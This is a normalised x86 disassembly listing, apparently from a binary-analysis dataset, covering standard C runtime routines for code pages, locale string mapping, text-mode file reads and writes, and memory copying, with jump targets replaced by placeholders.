or [ eax + rw-data ] 0x4
inc eax
jmp r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
cmp eax edx
ja r-xdata
sub_40a558
mov eax [ esp + 0x4 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetOEMCP@IAT ]
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetACP@IAT ]
retn
mov eax [ rw-data ]
mov [ rw-data ] 0x1
sub_40a5a2
mov eax [ esp + 0x4 ]
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_40a5d5
push edi
push 0x40
pop ecx
xor eax eax
mov edi rw-data
[ edi ]
stosb [ edi ]
xor eax eax
mov edi rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
retn
sub_40a5fe
push ebp
mov ebp esp
sub esp 0x514
lea eax [ ebp - 0x14 ]
push esi
push eax
push [ rw-data ]
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
mov esi 0x100
xor eax eax
mov esi 0x100
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
ja r-xdata
mov [ ebp + eax - 0x114 ] al
inc eax
cmp eax esi
jb r-xdata
mov al [ ebp - 0xe ]
mov [ ebp - 0x114 ] 0x20
test al al
je r-xdata
and [ eax + rw-data ] 0x0
cmp eax 0x7a
ja r-xdata
or [ eax + rw-data ] 0x10
mov cl al
add cl 0x20
push 0x0
lea eax [ ebp - 0x514 ]
push [ rw-data ]
push [ rw-data ]
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x1
call sub_408870
push 0x0
lea eax [ ebp - 0x214 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push esi
push [ rw-data ]
call sub_40b353
push 0x0
lea eax [ ebp - 0x314 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x200
push [ rw-data ]
call sub_40b353
add esp 0x5c
xor eax eax
lea ecx [ ebp - 0x514 ]
push ebx
push edi
lea edx [ ebp - 0xd ]
cmp eax 0x41
jb r-xdata
pop esi
leave
retn
or [ eax + rw-data ] 0x20
mov cl al
sub cl 0x20
jmp r-xdata
inc eax
cmp eax esi
jb r-xdata
test dl 0x2
je r-xdata
or [ eax + rw-data ] 0x10
mov dl [ ebp + eax - 0x214 ]
inc edx
inc edx
mov al [ edx - 0x1 ]
test al al
jne r-xdata
sub ecx eax
lea edi [ ebp + eax - 0x114 ]
inc ecx
mov eax 0x20202020
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov [ eax + rw-data ] cl
jmp r-xdata
and [ eax + rw-data ] 0x0
or [ eax + rw-data ] 0x20
mov dl [ ebp + eax - 0x314 ]
jmp r-xdata
inc eax
inc ecx
inc ecx
cmp eax esi
jb r-xdata
movzx ecx [ edx ]
movzx eax al
cmp eax ecx
ja r-xdata
pop edi
pop ebx
mov dx [ ecx ]
test dl 0x1
je r-xdata
jmp r-xdata
mov [ eax + rw-data ] dl
jmp r-xdata
sub_40a79f
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push ebx
call [ rw-data ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
push ebx
call eax
mov ebx eax
sub_40a830
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
inc edx
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
inc eax
retn
or al al
je r-xdata
or al al
je r-xdata
inc ecx
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_40a8b4
cmp [ rw-data ] 0x0
push ebx
push esi
mov esi [ rw-data ]
push edi
je r-xdata
xor eax eax
test esi esi
jne r-xdata
mov ebx [ esp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ rw-data ] esi
je r-xdata
push ebx
call sub_405b40
pop ecx
mov edi eax
call sub_40b5e1
test eax eax
jne r-xdata
push eax
call sub_405b40
cmp eax edi
pop ecx
jbe r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
add esi 0x4
jmp r-xdata
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push edi
push ebx
push eax
call sub_40b5a2
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40a931
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x40
je r-xdata
push esi
call sub_406630
push esi
call sub_40a962
push esi
mov edi eax
call sub_406682
add esp 0xc
and [ esi + 0xc ] 0x0
jmp r-xdata
mov eax edi
pop edi
pop esi
retn
sub_40a962
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x83
je r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
pop edi
pop esi
retn
push esi
call sub_409156
push esi
mov edi eax
call sub_40b72f
push [ esi + 0x10 ]
call sub_40b64f
add esp 0xc
test eax eax
jge r-xdata
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_40706c
and [ esi + 0x1c ] 0x0
pop ecx
sub_40a9ae
push ebx
mov ebx [ esp + 0x8 ]
cmp ebx [ rw-data ]
push esi
push edi
jae r-xdata
call sub_40acad
mov [ eax ] 0x9
or eax 0xffffffff
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ebx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
test [ eax + esi + 0x4 ] 0x1
je r-xdata
push ebx
call sub_40b81b
mov eax [ edi ]
pop ecx
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_40acad
mov [ eax ] 0x9
or esi 0xffffffff
push ebx
call sub_40b7d9
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
xor esi esi
call [ GetLastError@IAT ]
mov esi eax
jmp r-xdata
push ebx
call sub_40b87a
pop ecx
mov eax esi
jmp r-xdata
call sub_40acb6
mov [ eax ] esi
test esi esi
je r-xdata
sub_40aa41
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_40acad
mov [ eax ] 0x9
call sub_40acb6
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_40b81b
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_40aaa6
push esi
mov edi eax
call sub_40b87a
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_40aaa6
push ebp
mov ebp esp
sub esp 0x414
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jne r-xdata
mov eax [ ebp + 0x8 ]
sar eax 0x5
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebp + 0x8 ]
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ ebx ]
shl esi 0x2
test [ eax + esi + 0x4 ] 0x20
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
add eax esi
test [ eax + 0x4 ] 0x80
je r-xdata
push 0x2
push edi
push [ ebp + 0x8 ]
call sub_40ad24
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0xc ]
push edi
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] edi
jbe r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x40
je r-xdata
lea eax [ ebp - 0x414 ]
mov eax [ ebp - 0x8 ]
cmp eax edi
jne r-xdata
call sub_40acad
mov [ eax ] 0x1c
call sub_40acb6
mov [ eax ] edi
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x1a
je r-xdata
mov edi eax
lea eax [ ebp - 0x414 ]
sub edi eax
lea eax [ ebp - 0xc ]
push 0x0
push eax
lea eax [ ebp - 0x414 ]
push edi
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov cl [ ecx ]
cmp cl 0xa
jne r-xdata
sub eax [ ebp - 0x10 ]
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
cmp eax edi
jl r-xdata
mov [ eax ] cl
inc eax
mov ecx eax
lea edx [ ebp - 0x414 ]
sub ecx edx
cmp ecx 0x400
jl r-xdata
inc [ ebp - 0x10 ]
mov [ eax ] 0xd
inc eax
push 0x5
pop esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
xor edi edi
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0xc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp + 0x8 ]
call sub_40ac3a
pop ecx
call sub_40acad
mov [ eax ] 0x9
call sub_40acb6
mov [ eax ] esi
jmp r-xdata
sub_40ac3a
push esi
call sub_40acb6
mov ecx [ esp + 0x8 ]
xor esi esi
mov [ eax ] ecx
mov eax rw-data
call sub_40acad
mov ecx [ esi * 8 + rw-data ]
pop esi
mov [ eax ] ecx
retn
add eax 0x8
inc esi
cmp eax rw-data
jl r-xdata
cmp ecx [ eax ]
je r-xdata
cmp ecx 0x13
jb r-xdata
cmp ecx 0xbc
jb r-xdata
cmp ecx 0x24
ja r-xdata
call sub_40acad
mov [ eax ] 0x16
pop esi
retn
cmp ecx 0xca
ja r-xdata
call sub_40acad
mov [ eax ] 0xd
pop esi
retn
call sub_40acad
mov [ eax ] 0x8
pop esi
retn
sub_40acbf
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_40acad
mov [ eax ] 0x9
call sub_40acb6
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_40b81b
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_40ad24
push esi
mov edi eax
call sub_40b87a
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_40ad24
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_40b7d9
cmp eax 0xffffffff
pop ecx
jne r-xdata
push [ esp + 0x14 ]
push 0x0
push [ esp + 0x18 ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_40acad
mov [ eax ] 0x9
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx esi
and esi 0x1f
sar ecx 0x5
mov eax esi
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
and [ ecx + eax * 4 + 0x4 ] 0xfd
lea eax [ ecx + eax * 4 + 0x4 ]
mov eax edi
push eax
call sub_40ac3a
pop ecx
test eax eax
je r-xdata
pop edi
pop esi
retn
sub_40ad97
inc [ rw-data ]
push 0x1000
call sub_4070b4
pop ecx
mov ecx [ esp + 0x4 ]
test eax eax
mov [ ecx + 0x8 ] eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
retn
sub_40ade0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_40ae40 ]
jmp [ ecx * 4 + jump_table_40aebc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40af28 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40af28 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_40b0c0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_40afc8 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40b0c0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40af28 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40af28 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40af28 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40b0c0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40b0c0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40b0c0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40b0c0 ]
sub_40b115
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_40acad
mov [ eax ] 0x9
call sub_40acb6
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_40b81b
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_40b17a
push esi
mov edi eax
call sub_40b87a
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_40b17a
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x8 ] 0x0
cmp [ ebp + 0x10 ] 0x0
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edx ebx
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea esi [ eax + eax * 8 ]
mov eax [ ecx * 4 + rw-data ]
lea edi [ ecx * 4 + rw-data ]
shl esi 0x2
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x2
jne r-xdata
test cl 0x48
je r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov eax [ edi ]
push [ ebp + 0x10 ]
push edx
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov al [ eax + 0x5 ]
cmp al 0xa
je r-xdata
mov eax [ edi ]
mov edx [ ebp - 0xc ]
add [ ebp - 0x8 ] edx
lea ecx [ eax + esi + 0x4 ]
mov al [ eax + esi + 0x4 ]
test al 0x80
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
dec [ ebp + 0x10 ]
mov [ ebx ] al
mov eax [ edi ]
lea edx [ ebx + 0x1 ]
mov [ ebp - 0x8 ] 0x1
mov [ eax + esi + 0x5 ] 0xa
mov eax [ ebp - 0x8 ]
jmp r-xdata
test edx edx
je r-xdata
cmp eax 0x6d
je r-xdata
call sub_40acad
mov [ eax ] 0x9
call sub_40acb6
mov [ eax ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and al 0xfb
cmp [ ebx ] 0xa
jne r-xdata
push eax
call sub_40ac3a
pop ecx
or eax 0xffffffff
jmp r-xdata
sub ebx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ebx
mov eax [ ebp + 0x10 ]
mov al [ eax ]
cmp al 0x1a
je r-xdata
or al 0x4
jmp r-xdata
mov eax [ edi ]
lea esi [ eax + esi + 0x4 ]
mov al [ esi ]
test al 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov [ ecx ] al
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
add ecx eax
cmp eax ecx
mov [ ebp - 0x8 ] ecx
jae r-xdata
or al 0x2
mov [ esi ] al
dec ecx
cmp [ ebp + 0x10 ] ecx
jae r-xdata
mov [ ebx ] al
inc ebx
inc [ ebp + 0x10 ]
jmp r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
inc [ ebp + 0x10 ]
lea eax [ ebp - 0x1 ]
push 0x1
push eax
mov eax [ edi ]
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
inc eax
cmp [ eax ] 0xa
jne r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ebp + 0x10 ] ecx
jb r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebx ] 0xd
inc ebx
mov [ ebp + 0x10 ] eax
jmp r-xdata
add [ ebp + 0x10 ] 0x2
jmp r-xdata
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x48
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jne r-xdata
mov al [ ebp - 0x1 ]
cmp al 0xa
je r-xdata
inc ebx
push 0x1
push 0xffffffff
push [ ebp + 0x8 ]
call sub_40ad24
add esp 0xc
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
jne r-xdata
mov [ ebx ] 0xd
mov ecx [ edi ]
inc ebx
mov [ ecx + esi + 0x5 ] al
jmp r-xdata
sub_40b353
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x14 ] edi
jle r-xdata
push edi
push edi
push 0x1
pop ebx
push ebx
push r--data
mov esi 0x100
push esi
push edi
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_40b577
pop ecx
pop ecx
mov [ ebp + 0x14 ] eax
push edi
push edi
push ebx
push r--data
push esi
push edi
call [ LCMapStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
jmp r-xdata
xor eax eax
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] edi
jne r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x24 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov ebx eax
mov [ ebp - 0x1c ] ebx
cmp ebx edi
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
mov [ ebp - 0x4 ] edi
lea eax [ ebx + ebx ]
add eax 0x3
and al 0xfc
call sub_405d70
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x24 ] edi
je r-xdata
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
cmp esi edi
je r-xdata
test [ ebp + 0xd ] 0x4
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_405d70
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x20 ] ebx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
cmp ebx edi
je r-xdata
mov eax esi
jmp r-xdata
cmp esi [ ebp + 0x1c ]
jg r-xdata
push esi
push ebx
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] edi
push edi
push edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push edi
jmp r-xdata
push esi
push ebx
push 0x220
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp esi edi
je r-xdata
sub_40b577
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
test edx edx
push esi
lea ecx [ edx - 0x1 ]
je r-xdata
cmp [ eax ] 0x0
pop esi
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax edx
retn
sub eax [ esp + 0x4 ]
retn
inc eax
mov esi ecx
dec ecx
test esi esi
jne r-xdata
sub_40b5a2
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push [ rw-data ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
push 0x1
push [ rw-data ]
call sub_40b95a
add esp 0x1c
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
add eax 0xfffffffe
pop ebp
retn
mov eax 0x7fffffff
pop ebp
retn
sub_40b5e1
push ecx
push ebx
push ebp
push esi
mov esi [ rw-data ]
push edi
xor edi edi
mov eax [ esi ]
cmp eax edi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push ebp
call sub_4070b4
cmp eax edi
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push edi
push edi
push ebp
push eax
push 0xffffffff
push [ esi ]
push edi
push 0x1
call ebx
test eax eax
je r-xdata
push edi
push [ esp + 0x14 ]
call sub_40bbd7
mov eax [ esi + 0x4 ]
add esi 0x4
pop ecx
cmp eax edi
pop ecx
jne r-xdata
push edi
push edi
push edi
push edi
push 0xffffffff
push eax
push edi
push 0x1
call ebx
